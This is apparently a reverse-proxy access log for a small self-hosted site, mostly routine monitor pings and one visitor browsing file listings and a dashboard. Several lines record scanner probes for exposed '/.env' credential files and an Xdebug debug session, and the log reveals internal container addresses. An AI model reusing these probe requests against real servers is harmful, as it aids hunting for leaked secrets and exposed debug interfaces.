83.97.73.87 - - [15/Dec/2023:06:26:37 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 17 "-" "-" 5226 "web-to-websecure@internal" "-" 0ms
83.97.73.87 - - [15/Dec/2023:06:26:37 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 5227 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:06:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5228 "www@docker" "http://172.25.0.8:80" 1ms
46.98.172.220 - - [15/Dec/2023:06:27:19 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5229 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:06:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5230 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5231 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5232 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:06:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5233 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5234 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:06:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5235 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5236 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:06:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5237 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:06:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5238 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5239 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5240 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5241 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5242 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5243 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:06:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5244 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:06:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5245 "www@docker" "http://172.25.0.8:80" 1ms
172.105.128.11 - - [15/Dec/2023:06:35:16 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5246 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:06:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5247 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:06:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5248 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5249 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5250 "www@docker" "http://172.25.0.8:80" 1ms
35.190.199.12 - - [15/Dec/2023:06:36:53 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5251 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:06:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5252 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:06:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5253 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:06:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5254 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5255 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5256 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5257 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5258 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5259 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5260 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5261 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5262 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5263 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5264 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5265 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5266 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5267 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5268 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5269 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5270 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5271 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5272 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5273 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5274 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:06:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5275 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5276 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5277 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5278 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:06:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5279 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:06:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5280 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5281 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5282 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5283 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:06:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5284 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:06:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5285 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:06:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5286 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:06:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5287 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5288 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5289 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:06:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5290 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:06:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5291 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5292 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:06:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5293 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:06:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5294 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5295 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5296 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5297 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:07:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5298 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5299 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5300 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5301 "www@docker" "http://172.25.0.8:80" 0ms
72.167.141.39 - - [15/Dec/2023:07:01:50 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 5302 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:07:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5303 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [15/Dec/2023:07:02:35 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5304 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:07:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5305 "www@docker" "http://172.25.0.8:80" 0ms
54.37.79.75 - - [15/Dec/2023:07:02:58 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 5306 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [15/Dec/2023:07:02:58 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 5307 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:07:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5308 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5309 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5310 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:07:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5311 "www@docker" "http://172.25.0.8:80" 0ms
35.203.210.5 - - [15/Dec/2023:07:05:06 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5312 "-" "-" 0ms
162.216.149.248 - - [15/Dec/2023:07:05:14 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5313 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:07:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5314 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5315 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:07:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5316 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5317 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:07:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5318 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5319 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:07:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5320 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:07:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5321 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:07:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5322 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5323 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:07:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5324 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [15/Dec/2023:07:10:27 +0000] "GET /.env HTTP/2.0" 404 555 "-" "-" 5325 "www@docker" "http://172.25.0.8:80" 29ms
173.48.140.140 - - [15/Dec/2023:07:10:27 +0000] "GET /favicon.ico HTTP/2.0" 404 555 "-" "-" 5326 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [15/Dec/2023:07:10:31 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5327 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [15/Dec/2023:07:10:32 +0000] "GET /styles.css HTTP/2.0" 304 0 "-" "-" 5328 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5329 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [15/Dec/2023:07:10:38 +0000] "GET /private HTTP/2.0" 301 169 "-" "-" 5330 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [15/Dec/2023:07:10:38 +0000] "GET /private/ HTTP/2.0" 200 264 "-" "-" 5331 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [15/Dec/2023:07:10:48 +0000] "GET /web HTTP/2.0" 404 555 "-" "-" 5332 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [15/Dec/2023:07:11:02 +0000] "GET /trace/ HTTP/2.0" 200 2274 "-" "-" 5333 "livetrace@docker" "http://172.25.0.5:80" 4ms
173.48.140.140 - - [15/Dec/2023:07:11:02 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 200 1304 "-" "-" 5334 "livetrace@docker" "http://172.25.0.5:80" 0ms
173.48.140.140 - - [15/Dec/2023:07:11:15 +0000] "GET /trace/start.php?id=79f5kx31h HTTP/2.0" 200 104 "-" "-" 5335 "livetrace@docker" "http://172.25.0.5:80" 3ms
173.48.140.140 - - [15/Dec/2023:07:11:16 +0000] "GET /trace/poll.php?id=79f5kx31h HTTP/2.0" 200 89 "-" "-" 5336 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [15/Dec/2023:07:11:17 +0000] "GET /trace/poll.php?id=79f5kx31h HTTP/2.0" 200 89 "-" "-" 5337 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [15/Dec/2023:07:11:18 +0000] "GET /trace/poll.php?id=79f5kx31h HTTP/2.0" 200 90 "-" "-" 5338 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [15/Dec/2023:07:11:19 +0000] "GET /trace/poll.php?id=79f5kx31h HTTP/2.0" 200 90 "-" "-" 5339 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [15/Dec/2023:07:11:20 +0000] "GET /trace/poll.php?id=79f5kx31h HTTP/2.0" 200 91 "-" "-" 5340 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [15/Dec/2023:07:11:21 +0000] "GET /trace/poll.php?id=79f5kx31h HTTP/2.0" 200 91 "-" "-" 5341 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [15/Dec/2023:07:11:22 +0000] "GET /trace/poll.php?id=79f5kx31h HTTP/2.0" 200 90 "-" "-" 5342 "livetrace@docker" "http://172.25.0.5:80" 2ms
159.203.109.206 - - [15/Dec/2023:07:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5343 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [15/Dec/2023:07:11:23 +0000] "GET /trace/poll.php?id=79f5kx31h HTTP/2.0" 200 99 "-" "-" 5344 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [15/Dec/2023:07:11:23 +0000] "GET /trace/cleanup.php?id=79f5kx31h HTTP/2.0" 200 71 "-" "-" 5345 "livetrace@docker" "http://172.25.0.5:80" 2ms
167.71.120.76 - - [15/Dec/2023:07:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5346 "www@docker" "http://172.25.0.8:80" 1ms
173.48.140.140 - - [15/Dec/2023:07:11:59 +0000] "GET /pub/ HTTP/2.0" 200 11824 "-" "-" 5347 "www@docker" "http://172.25.0.8:80" 26ms
173.48.140.140 - - [15/Dec/2023:07:11:59 +0000] "GET /pub/app/assets/hljs-github-dark.css HTTP/2.0" 200 1315 "-" "-" 5348 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [15/Dec/2023:07:11:59 +0000] "GET /pub/app/assets/app.css?id=87a8bca086256c2fc5ed2391763bc488 HTTP/2.0" 200 110476 "-" "-" 5349 "www@docker" "http://172.25.0.8:80" 118ms
173.48.140.140 - - [15/Dec/2023:07:12:03 +0000] "GET /pub/?dir=Backgrounds HTTP/2.0" 200 16346 "-" "-" 5350 "www@docker" "http://172.25.0.8:80" 10ms
173.48.140.140 - - [15/Dec/2023:07:12:06 +0000] "GET /pub/ HTTP/2.0" 200 11824 "-" "-" 5351 "www@docker" "http://172.25.0.8:80" 11ms
173.48.140.140 - - [15/Dec/2023:07:12:08 +0000] "GET /pub/?dir=HP-48 HTTP/2.0" 200 16666 "-" "-" 5352 "www@docker" "http://172.25.0.8:80" 12ms
173.48.140.140 - - [15/Dec/2023:07:12:09 +0000] "GET /pub/ HTTP/2.0" 200 11824 "-" "-" 5353 "www@docker" "http://172.25.0.8:80" 12ms
159.203.109.206 - - [15/Dec/2023:07:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5354 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5355 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [15/Dec/2023:07:12:53 +0000] "GET /pub/?dir=Backgrounds HTTP/2.0" 200 16346 "-" "-" 5356 "www@docker" "http://172.25.0.8:80" 16ms
159.203.109.206 - - [15/Dec/2023:07:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5357 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5358 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:07:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5359 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:07:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5360 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:19 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:19 +0000] "GET /dashboard/ HTTP/1.1" 200 3124 "-" "-" 2 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:19 +0000] "GET /dashboard/js/app.ccc19229.js HTTP/1.1" 200 40731 "-" "-" 3 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:19 +0000] "GET /dashboard/js/runtime.f8368add.js HTTP/1.1" 200 4057 "-" "-" 5 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:19 +0000] "GET /dashboard/css/067758be.3de973dd.css HTTP/1.1" 200 1027 "-" "-" 7 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:19 +0000] "GET /dashboard/css/041f4ca8.f6e3d404.css HTTP/1.1" 200 662 "-" "-" 8 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:19 +0000] "GET /dashboard/css/09354cb8.0e433876.css HTTP/1.1" 200 0 "-" "-" 9 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:19 +0000] "GET /dashboard/css/app.3d2d5994.css HTTP/1.1" 200 204768 "-" "-" 4 "dashboard@internal" "-" 154ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/css/11f98cd8.02647ec3.css HTTP/1.1" 200 3153 "-" "-" 10 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/css/29ab06d1.ec33fe24.css HTTP/1.1" 200 7001 "-" "-" 11 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/css/3e3ce03c.9b22e80f.css HTTP/1.1" 200 378 "-" "-" 12 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/css/46fd955e.9b22e80f.css HTTP/1.1" 200 378 "-" "-" 13 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/css/491024e9.9b22e80f.css HTTP/1.1" 200 378 "-" "-" 14 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/css/4d42dcea.3856608f.css HTTP/1.1" 200 3201 "-" "-" 15 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/css/52875482.9b22e80f.css HTTP/1.1" 200 378 "-" "-" 16 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/css/6d73c73c.9b22e80f.css HTTP/1.1" 200 378 "-" "-" 17 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/css/76baf610.0962c6be.css HTTP/1.1" 200 867 "-" "-" 18 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/css/77d911b4.9b22e80f.css HTTP/1.1" 200 378 "-" "-" 19 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/css/797e4f23.9b22e80f.css HTTP/1.1" 200 378 "-" "-" 20 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/css/e036c7dc.1666b9a0.css HTTP/1.1" 200 2871 "-" "-" 21 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/css/b34404c8.9b22e80f.css HTTP/1.1" 200 378 "-" "-" 22 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/js/041f4ca8.4f70d06d.js HTTP/1.1" 200 3067 "-" "-" 23 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/js/067758be.c7890581.js HTTP/1.1" 200 11437 "-" "-" 24 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/js/09354cb8.2e39e534.js HTTP/1.1" 200 4824 "-" "-" 25 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/js/29ab06d1.8f1fa71a.js HTTP/1.1" 200 28499 "-" "-" 26 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:19 +0000] "GET /dashboard/js/vendor.f60bcb86.js HTTP/1.1" 200 506585 "-" "-" 6 "dashboard@internal" "-" 387ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/js/2d21e8fd.c00ac0e6.js HTTP/1.1" 200 701 "-" "-" 28 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/js/3e3ce03c.293f4729.js HTTP/1.1" 200 6859 "-" "-" 29 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/js/46fd955e.343a8488.js HTTP/1.1" 200 6868 "-" "-" 30 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/js/491024e9.5ba4955c.js HTTP/1.1" 200 6856 "-" "-" 31 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/js/4d42dcea.18f43827.js HTTP/1.1" 200 39952 "-" "-" 32 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/js/52875482.65e645a6.js HTTP/1.1" 200 6873 "-" "-" 33 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/js/6d73c73c.d8a27bbb.js HTTP/1.1" 200 6856 "-" "-" 34 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/js/76baf610.7509c35c.js HTTP/1.1" 200 19325 "-" "-" 35 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/js/77d911b4.8d5002b7.js HTTP/1.1" 200 6870 "-" "-" 36 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/js/797e4f23.771f63ae.js HTTP/1.1" 200 6912 "-" "-" 37 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/js/b34404c8.7a4b9be8.js HTTP/1.1" 200 6917 "-" "-" 38 "dashboard@internal" "-" 0ms
173.48.140.140 - - [15/Dec/2023:07:22:20 +0000] "GET /dashboard/js/e036c7dc.5d7ae0bf.js HTTP/1.1" 200 17184 "-" "-" 39 "dashboard@internal" "-" 0ms
